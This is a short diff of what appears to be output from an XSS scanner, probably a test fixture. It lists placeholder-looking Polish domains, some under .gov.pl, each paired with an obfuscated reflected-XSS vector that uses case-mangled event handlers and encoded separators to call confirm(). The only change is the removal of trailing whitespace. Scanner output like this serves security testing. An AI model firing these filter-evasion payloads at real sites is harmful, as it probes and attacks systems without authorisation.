@@ -5,10 +5,10 @@
 [++] Vulnerable webpage: https://mocktest.pl/kupuje
 [++] Vector for a: "><HTML/+/oNMOUsEOveR+=+confirm()//
 [++] Vulnerable webpage: http://testdomain.pl/test.php
-[++] Vector for searchWord: "><DeTAiLS%0doNtoGGLE%0d=%0d[8].find(confirm)%0dx// 
+[++] Vector for searchWord: "><DeTAiLS%0doNtoGGLE%0d=%0d[8].find(confirm)%0dx//
 [++] Vulnerable webpage: http://mockdomain.gov.pl/index.php
 [++] Vector for searchWord: "><DeTAiLS%0doNtoGGLE%0d=%0d[8].find(confirm)%0dx//
 [++] Vulnerable webpage: https://mocktest.gov.pl/kupuje
 [++] Vector for a: "><HTML/+/oNMOUsEOveR+=+confirm()//
 [++] Vulnerable webpage: http://testdomain.gov.pl/test.php
-[++] Vector for searchWord: "><DeTAiLS%0doNtoGGLE%0d=%0d[8].find(confirm)%0dx// 
+[++] Vector for searchWord: "><DeTAiLS%0doNtoGGLE%0d=%0d[8].find(confirm)%0dx//
